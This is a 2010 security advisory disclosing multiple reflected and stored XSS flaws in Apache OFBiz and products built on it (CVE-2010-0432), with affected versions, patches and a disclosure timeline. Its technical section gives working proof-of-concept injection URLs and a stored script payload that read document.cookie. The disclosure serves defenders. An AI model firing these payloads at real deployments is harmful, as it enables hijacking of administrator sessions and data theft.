@@ -1,0 +1,257 @@
+           Bonsai Information Security - Advisory
+             http://www.bonsai-sec.com/research/
+
+                   Multiple XSS in Apache OFBiz
+
+1. *Advisory Information*
+
+Title: Multiple XSS in Apache OFBiz
+Advisory ID: BONSAI-2010-0103
+Advisory URL: http://www.bonsai-sec.com/research/vulnerabilities/apacheofbiz-multiple-xss-0103.php
+Date published: 2010-04-13
+Vendors contacted: Apache Software Foundation
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Multiple Cross Site Scripting (XSS)
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Name: CVE-2010-0432
+
+
+3. *Software Description*
+
+Apache Open For Business (Apache OFBiz) is a community-driven 
+Open Source Enterprise Resource Planning (ERP) system. 
+It provides a suite of enterprise applications that integrate 
+and automate many of the business processes of an enterprise. 
+Apache OFBiz is a foundation and starting point for reliable, 
+secure and scalable enterprise solutions.
+OFBiz is an Apache Software Foundation top level project. 
+
+
+4. *Vulnerability Description*
+
+Cross-Site Scripting attacks are a type of injection problem, in which 
+malicious scripts are injected into the otherwise benign and trusted web sites.
+Cross-site scripting (XSS) attacks occur when an attacker uses a web 
+application to send malicious code, generally in the form of a browser side 
+script, to a different end user. Flaws that allow these attacks to succeed are
+quite widespread and occur anywhere a web application uses input from a user
+in the output it generates without validating or encoding it. 
+
+This vulnerability can be exploited to force a logged in Administrator
+to run arbitrary SQL commands [3] or create a new user with Full Privileges [4].
+You can find customized XSS PoC payloads here.
+
+For additional information and a demonstrative video, please read [1] and [2].
+
+
+5. *Vulnerable packages*
+
+Apache OFBiz:
+    - Stable Version <= 9.04
+    - SVN Revision <=  920371
+    - Release Branch Candidate 4.0 Revision <= 920381
+
+Products based on Apache OFBiz:
+    - Opentaps Version <= 1.4
+    - Neogia Version <=  1.0
+    - Entente Oya Version <= 1.6
+
+Since there are more products based on Apache OFBiz, these vulnerabilities resides
+in some of them but unconfirmed. Check [2] for updates.
+
+
+6. *Mitigation*
+
+SVN Trunk users should update to at least revision 920372 
+from svn or apply the following patches [5].
+Release Branch Candidate 09.04 should update to at least revision 920382 
+from svn or applythe following patches [6].
+Apache Software Foundation developers informed us that all users should 
+upgrade to the latest version of Apache OFBiz, which fixes this vulnerability. 
+More information to be found here:
+
+    http://ofbiz.apache.org
+
+
+7. *Credits*
+
+These vulnerabilities were discovered by Lucas Apa ( lucas -at- bonsai-sec.com ).
+
+
+8. *Technical Description*
+
+8.1 A Reflected Cross Site Scripting vulnerability was found in the 
+"productStoreId" variable within the 'Export Product Listing' section.
+When rendering menu widget item links of type hidden-form, the hidden
+input value attributes were not being html encoded. In many cases these 
+hidden input values are derived from request parameters and could be used 
+in a Reflected Cross-Site Scripting attack.
+
+For a page that contains a menu widget with the following menu item definition:
+<menu-item name="ebayExportAllCategoryToEbayStore" title="${uiLabelMap.EbayExportAllCategoryToEbayStore}">
+  <link target="exportCategoryEbayStore">
+    <parameter param-name="productStoreId" value="${parameters.productStoreId}"/>
+  </link>
+</menu-item>
+
+The vulnerability can be triggered by clicking on the 
+following URL:
+
+https://www.ofbiz-example.com/ebaystore/control/exportProductListing?productStoreId=90100"
+style="width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px"
+onMouseOver="alert(document.cookie)
+
+
+8.2 A Reflected Cross Site Scripting vulnerability was found in the 
+"partyId" variable within the 'View Profile' section.
+This is because the application does not properly sanitise
+the users input. The vulnerability can be triggered by clicking on the 
+following URL:
+
+https://www.ofbiz-example.com/partymgr/control/viewprofile?&partyId=aa"
+style="width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px"
+onMouseOver="alert(document.cookie)
+
+https://www.neogia-example.com/partymgr/control/login;partyId=aa"
+style="width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px"
+onMouseOver="alert(document.cookie)
+
+https://www.opentaps-example.com/partymgr/control/viewprofile?partyId=aa"
+style="width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px"
+onMouseOver="alert(document.cookie)
+
+
+8.3 A Reflected Cross Site Scripting vulnerability was found in the 
+"start" variable within the 'Show Portal Page' section.
+During page rendering, if a FreeMarker TemplateException is thrown 
+then the stack trace is printed directly into the response and the 
+exception messages may contain un-sanitized user input which can expose 
+a Reflected Cross-Site Scripting vulnerability.
+
+For any page rendered via a FreeMarker template that contains:
+${screens.render(screenLocation, screenName)}
+(or a similar screens.render(…) call)
+
+The vulnerability can be triggered by clicking on the 
+following URL:
+
+https://www.ofbiz-example.com/myportal/control/showPortalPage?period=week
+&start=1266796800000\<script>alert(document.cookie)</script>
+
+
+8.4 A 404-based Reflected Cross Site Scripting vulnerability was found
+on the whole application.
+When using the ControlServlet, if an invalid request URI is supplied then 
+the 404 error page displays the requested URI without first sanitizing it.  
+The vulnerability can be triggered by clicking on the 
+following URL:
+
+https://www.ofbiz-example.com/facility/control/ReceiveReturn"<b><body onLoad="alert(document.cookie)"><br><div>><!--
+
+https://www.neogia-example.com/facility/control/ReceiveReturn"<b><body onLoad="alert(document.cookie)"><br><div>><!--
+
+http://www.opentaps-example.com/crmsfa/control/ReceiveReturn"<b><body onLoad="alert(document.cookie)"><br><div>><!--
+
+https://www.ententeoya-example.com/cms/control/ReceiveReturn"<b><body onLoad="alert(document.cookie)"><br><div>><!--
+
+
+8.5 A  Reflected Cross Site Scripting vulnerability was found
+on the ecommerce section specifically in the 'entityName' variable.
+The vulnerability can be triggered by clicking on the 
+following URL:
+
+http://www.ofbiz-example.com/ecommerce/control/ViewBlogArticle?contentId=BLG10000\<script>
+alert(document.cookie)</script>&blogContentId=BLOGROOTBIGAL
+
+http://www.opentaps-example.com/ecommerce/control/ViewBlogArticle?contentId=BLG10000\<script>
+alert(document.cookie)</script>&blogContentId=BLOGROOTBIGAL
+
+
+8.6 A Reflected Cross Site Scripting vulnerability was found in the 
+"entityName" variable within the 'Web Tools' section.
+This is because the application fails to correctly sanitize 
+multiple form widget controls data before rendering it. 
+The vulnerability can be triggered by clicking on the 
+following URL:
+
+https://www.ofbiz-example.com/webtools/control/FindGeneric?entityName=AccommodationClass\<script>
+alert(document.cookie)</script>&find=true&VIEW_SIZE=50&VIEW_INDEX=0
+
+8.7 A Persistant Cross Site Scripting vulnerability was found in almost 
+every user controlled parameters within the application.
+This is because the application does not properly sanitise
+the users input. An example of this vulnerability can be triggered by 
+following these steps.
+
+i) A logged in user sends the following string on 'subject' or 'content'
+parameters within the 'ecommerce/control/contactus' section.
+
+<script>alert(document.cookie)</script>
+
+ii) A logged in Administrator browses 'Other Party Comms' section.
+
+iii) The browser executes the JavaScript on every future Other Party Comms load.
+
+9. *Report Timeline*
+
+    - 2010-02-17:
+    Vulnerabilities were identified.
+
+    - 2010-02-23:
+    Vendor contacted.
+
+    - 2010-02-24:
+    Other products based on Ofbiz contacted. No specific answer given
+
+    - 2010-02-27:
+    Vendor confirms this issue and inform us a fix will be available soon.
+
+    - 2010-03-08:
+    Vendor fixed this issue.
+
+    - 2010-03-09:
+    Other products based on Ofbiz contacted again for an approximate fix release date. No answer.
+
+    - 2010-03-12:
+    Other products based on Ofbiz contacted. No answer.
+
+    - 2010-04-13:
+    The advisory BONSAI-2010-0103 is published.
+
+
+10. *References*
+
+[0] http://ofbiz.apache.org/
+[1] http://www.owasp.org/index.php/Cross_site_scripting
+[2] http://www.bonsai-sec.com/en/research/vulnerabilities/ofbizexploiter.php
+[3] http://www.bonsai-sec.com/en/research/vulnerabilities/create-user-xss-payload.js
+[4] http://www.bonsai-sec.com/en/research/vulnerabilities/sql-exec-xss-payload.js
+[5] http://svn.apache.org/viewvc?rev=920369&view=rev
+    http://svn.apache.org/viewvc?rev=920370&view=rev
+    http://svn.apache.org/viewvc?rev=920371&view=rev
+    http://svn.apache.org/viewvc?rev=920372&view=rev
+[6] http://svn.apache.org/viewvc?rev=920379&view=rev
+    http://svn.apache.org/viewvc?rev=920380&view=rev
+    http://svn.apache.org/viewvc?rev=920381&view=rev
+    http://svn.apache.org/viewvc?rev=920382&view=rev
+[7] http://www.bonsai-sec.com/blog
+
+11. *About Bonsai*
+
+Bonsai is a company involved in providing professional computer information security services.
+Currently a sound growth company, since its foundation in early 2009 in Buenos Aires, Argentina, 
+we are fully committed to quality service, and focused on our customers' real needs.
+
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2010 Bonsai Information Security, and may be 
+distributed freely provided that no fee is charged for this distribution and proper credit is 
+given.
+
+
